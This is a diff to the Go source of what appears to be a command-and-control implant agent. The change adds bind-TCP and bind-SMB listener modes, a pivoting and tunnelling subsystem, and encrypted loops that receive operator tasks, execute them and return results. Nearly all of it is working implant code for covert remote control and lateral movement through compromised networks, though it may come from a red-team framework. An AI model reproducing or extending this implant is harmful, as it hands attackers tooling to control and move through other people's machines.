@@ -5,6 +5,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/binary"
+	"errors"
 	"gopher/functions"
 	"gopher/utils"
 	"net"
@@ -18,8 +19,56 @@ import (
 )
 
 var ACTIVE = true
+var PIVOTTER = NewPivotter()
 
 var WakeupChan = make(chan struct{}, 1)
+
+func buildFlushPayload(sessionKey []byte, pivotBacklog, tunnelBacklog *[][]byte, lastUnsent utils.Message) ([]byte, error) {
+	var objects [][]byte
+	if lastUnsent.Type == 1 && len(lastUnsent.Object) > 0 {
+		objects = append(objects, lastUnsent.Object...)
+	}
+	pivotResults := PIVOTTER.ProcessPivots()
+	if len(*pivotBacklog) > 0 {
+		pivotResults = append(*pivotBacklog, pivotResults...)
+		*pivotBacklog = (*pivotBacklog)[:0]
+	}
+	if len(pivotResults) > 0 {
+		objects = append(objects, pivotResults...)
+	}
+	tun := collectTunnelData()
+	if len(*tunnelBacklog) > 0 {
+		tun = append(*tunnelBacklog, tun...)
+		*tunnelBacklog = (*tunnelBacklog)[:0]
+	}
+	if len(tun) > 0 {
+		objects = append(objects, tun...)
+	}
+	if len(objects) == 0 {
+		return nil, nil
+	}
+	out := utils.Message{Type: 1, Object: objects}
+	sendData, err := msgpack.Marshal(out)
+	if err != nil {
+		return nil, err
+	}
+	return utils.EncryptData(sendData, sessionKey)
+}
+
+func flushExchangeTeardown(conn net.Conn, sessionKey []byte, pivotBacklog, tunnelBacklog *[][]byte, lastUnsent utils.Message, send func([]byte) error) {
+	if conn == nil {
+		return
+	}
+	payload, err := buildFlushPayload(sessionKey, pivotBacklog, tunnelBacklog, lastUnsent)
+	if err != nil {
+		return
+	}
+	if len(payload) == 0 {
+		return
+	}
+	if err := send(payload); err != nil {
+	}
+}
 
 func CreateInfo() ([]byte, []byte) {
 	var (
@@ -84,6 +133,10 @@ var AgentId uint32
 var encKey []byte
 
 func main() {
+	agentMain()
+}
+
+func agentMain() {
 
 	for _, encProfile := range encProfiles {
 		key := make([]byte, 16)
@@ -119,14 +172,24 @@ func main() {
 	_, _ = rand.Read(r)
 	AgentId = binary.BigEndian.Uint32(r)
 
-	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
-	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
-	initMsg, _ = utils.EncryptData(initMsg, encKey)
-
 	UPLOADS = make(map[string][]byte)
 	DOWNLOADS = make(map[string]utils.Connection)
 	JOBS = make(map[string]utils.Connection)
 
+	switch profile.Protocol {
+	case "bind_tcp":
+		runBindTCP(sessionInfo, sessionKey, encKey)
+	case "bind_smb":
+		runBindSMB(sessionInfo, sessionKey, encKey)
+	default:
+		initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
+		initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
+		initMsg, _ = utils.EncryptData(initMsg, encKey)
+		runConnectTCP(sessionInfo, sessionKey, encKey, initMsg)
+	}
+}
+
+func runConnectTCP(sessionInfo []byte, sessionKey []byte, encKey []byte, initMsg []byte) {
 	addrIndex := 0
 	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
 		if i > 0 {
@@ -137,13 +200,11 @@ func main() {
 				profileIndex = (profileIndex + 1) % len(profiles)
 				profile = profiles[profileIndex]
 				encKey = encKeys[profileIndex]
-				initData, _ = msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
-				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
+				id, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
+				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: id})
 				initMsg, _ = utils.EncryptData(initMsg, encKey)
 			}
 		}
-
-		///// Connect
 
 		var (
 			err  error
@@ -175,52 +236,257 @@ func main() {
 			i = 0
 		}
 
-		/// Recv Banner
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
+				conn.Close()
 				continue
 			}
 		}
 
-		/// Send Init
-		_ = functions.SendMsg(conn, initMsg)
-
-		/// Recv Command
-
-		var (
-			inMessage  utils.Message
-			outMessage utils.Message
-			recvData   []byte
-			sendData   []byte
-		)
-
-		for ACTIVE {
-			recvData, err = functions.RecvMsg(conn)
-			if err != nil {
-				break
-			}
-
-			outMessage = utils.Message{Type: 0}
-			recvData, err = utils.DecryptData(recvData, sessionKey)
-			if err != nil {
-				break
-			}
-
-			err = msgpack.Unmarshal(recvData, &inMessage)
-			if err != nil {
-				break
-			}
-
-			if inMessage.Type == 1 {
-				outMessage.Type = 1
-				outMessage.Object = TaskProcess(inMessage.Object)
-			}
-
-			sendData, _ = msgpack.Marshal(outMessage)
-			sendData, _ = utils.EncryptData(sendData, sessionKey)
-			_ = functions.SendMsg(conn, sendData)
+		if err := functions.SendMsg(conn, initMsg); err != nil {
+			conn.Close()
+			continue
 		}
+
+		exchangeLoop(conn, sessionKey)
+		conn.Close()
+	}
+}
+
+func runBindTCP(sessionInfo []byte, sessionKey []byte, encKey []byte) {
+	if len(profile.Addresses) == 0 {
+		return
+	}
+	bindAddr := profile.Addresses[0]
+
+	listener, err := net.Listen("tcp", bindAddr)
+	if err != nil {
+		return
+	}
+	defer listener.Close()
+
+	beatPayload, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.AgentType, Data: sessionInfo})
+	beatPayload, _ = utils.EncryptData(beatPayload, encKey)
+
+	watermark := make([]byte, 4)
+	binary.LittleEndian.PutUint32(watermark, uint32(profile.Type))
+	beat := append(watermark, beatPayload...)
+
+	for ACTIVE {
+		conn, err := listener.Accept()
+		if err != nil {
+			continue
+		}
+
+		hdr := make([]byte, 4)
+		binary.LittleEndian.PutUint32(hdr, uint32(len(beat)))
+		if err := functions.WriteFull(conn, hdr); err != nil {
+			conn.Close()
+			continue
+		}
+		if err := functions.WriteFull(conn, beat); err != nil {
+			conn.Close()
+			continue
+		}
+
+		exchangeLoopLE(conn, sessionKey)
+		conn.Close()
+	}
+}
+
+func exchangeLoop(conn net.Conn, sessionKey []byte) {
+	var (
+		inMessage     utils.Message
+		outMessage    utils.Message
+		lastUnsent    utils.Message
+		recvData      []byte
+		sendData      []byte
+		err           error
+		pivotBacklog  [][]byte
+		tunnelBacklog [][]byte
+	)
+
+	defer func() {
+		pending := outMessage
+		if lastUnsent.Type == 1 && len(lastUnsent.Object) > 0 {
+			pending = lastUnsent
+		}
+		flushExchangeTeardown(conn, sessionKey, &pivotBacklog, &tunnelBacklog, pending, func(p []byte) error {
+			return functions.SendMsg(conn, p)
+		})
+	}()
+
+	const tcpPoll = 100 * time.Millisecond
+
+	for ACTIVE {
+		recvData, err = functions.RecvMsgPoll(conn, tcpPoll)
+		if err != nil {
+			if errors.Is(err, functions.ErrRecvMsgPollTimeout) {
+				if PIVOTTER.HasActivePivots() {
+					pivotBacklog = append(pivotBacklog, PIVOTTER.ProcessPivots()...)
+				}
+				tunnelBacklog = append(tunnelBacklog, collectTunnelData()...)
+				continue
+			}
+			break
+		}
+
+		outMessage = utils.Message{Type: 0}
+		recvData, err = utils.DecryptData(recvData, sessionKey)
+		if err != nil {
+			break
+		}
+
+		err = msgpack.Unmarshal(recvData, &inMessage)
+		if err != nil {
+			break
+		}
+		if len(inMessage.Object) > 0 {
+		}
+
+		if inMessage.Type == 1 {
+			outMessage.Type = 1
+			outMessage.Object = TaskProcess(inMessage.Object)
+		}
+
+		pivotResults := PIVOTTER.ProcessPivots()
+		if len(pivotBacklog) > 0 {
+			pivotResults = append(pivotBacklog, pivotResults...)
+			pivotBacklog = pivotBacklog[:0]
+		}
+		if len(pivotResults) > 0 {
+			outMessage.Type = 1
+			outMessage.Object = append(outMessage.Object, pivotResults...)
+		}
+
+		tunnelResults := collectTunnelData()
+		if len(tunnelBacklog) > 0 {
+			tunnelResults = append(tunnelBacklog, tunnelResults...)
+			tunnelBacklog = tunnelBacklog[:0]
+		}
+		if len(tunnelResults) > 0 {
+			outMessage.Type = 1
+			outMessage.Object = append(outMessage.Object, tunnelResults...)
+		}
+
+		sendData, err = msgpack.Marshal(outMessage)
+		if err != nil {
+			lastUnsent = outMessage
+			break
+		}
+		sendData, err = utils.EncryptData(sendData, sessionKey)
+		if err != nil {
+			lastUnsent = outMessage
+			break
+		}
+		if len(inMessage.Object) > 0 || len(outMessage.Object) > 0 {
+		}
+		if err = functions.SendMsg(conn, sendData); err != nil {
+			lastUnsent = outMessage
+			break
+		}
+		lastUnsent = utils.Message{Type: 0}
+		outMessage = utils.Message{Type: 0}
+	}
+}
+
+func exchangeLoopLE(conn net.Conn, sessionKey []byte) {
+	var (
+		inMessage     utils.Message
+		outMessage    utils.Message
+		lastUnsent    utils.Message
+		recvData      []byte
+		sendData      []byte
+		err           error
+		pivotBacklog  [][]byte
+		tunnelBacklog [][]byte
+	)
+
+	defer func() {
+		pending := outMessage
+		if lastUnsent.Type == 1 && len(lastUnsent.Object) > 0 {
+			pending = lastUnsent
+		}
+		flushExchangeTeardown(conn, sessionKey, &pivotBacklog, &tunnelBacklog, pending, func(p []byte) error {
+			return pivotSendFrame(conn, p)
+		})
+	}()
+
+	for ACTIVE {
+		recvData, err = pivotRecvFrame(conn, 100*time.Millisecond)
+		if err != nil {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				if PIVOTTER.HasActivePivots() {
+					pivotBacklog = append(pivotBacklog, PIVOTTER.ProcessPivots()...)
+				}
+				tunnelBacklog = append(tunnelBacklog, collectTunnelData()...)
+				continue
+			}
+			break
+		}
+
+		outMessage = utils.Message{Type: 0}
+		recvData, err = utils.DecryptData(recvData, sessionKey)
+		if err != nil {
+			break
+		}
+		err = msgpack.Unmarshal(recvData, &inMessage)
+		if err != nil {
+			break
+		}
+		if len(inMessage.Object) > 0 {
+		}
+
+		if inMessage.Type == 1 {
+			outMessage.Type = 1
+			outMessage.Object = TaskProcess(inMessage.Object)
+			if len(inMessage.Object) > 0 {
+			}
+		} else if len(inMessage.Object) > 0 {
+			outMessage.Type = 1
+			outMessage.Object = TaskProcess(inMessage.Object)
+		}
+
+		pivotResults := PIVOTTER.ProcessPivots()
+		if len(pivotBacklog) > 0 {
+			pivotResults = append(pivotBacklog, pivotResults...)
+			pivotBacklog = pivotBacklog[:0]
+		}
+		if len(pivotResults) > 0 {
+			outMessage.Type = 1
+			outMessage.Object = append(outMessage.Object, pivotResults...)
+		}
+
+		tunnelResults := collectTunnelData()
+		if len(tunnelBacklog) > 0 {
+			tunnelResults = append(tunnelBacklog, tunnelResults...)
+			tunnelBacklog = tunnelBacklog[:0]
+		}
+		if len(tunnelResults) > 0 {
+			outMessage.Type = 1
+			outMessage.Object = append(outMessage.Object, tunnelResults...)
+		}
+
+		sendData, err = msgpack.Marshal(outMessage)
+		if err != nil {
+			lastUnsent = outMessage
+			break
+		}
+		sendData, err = utils.EncryptData(sendData, sessionKey)
+		if err != nil {
+			lastUnsent = outMessage
+			break
+		}
+		if len(inMessage.Object) > 0 || len(outMessage.Object) > 0 {
+		}
+		err = pivotSendFrame(conn, sendData)
+		if err != nil {
+			lastUnsent = outMessage
+			break
+		}
+		lastUnsent = utils.Message{Type: 0}
+		outMessage = utils.Message{Type: 0}
 	}
 }
 
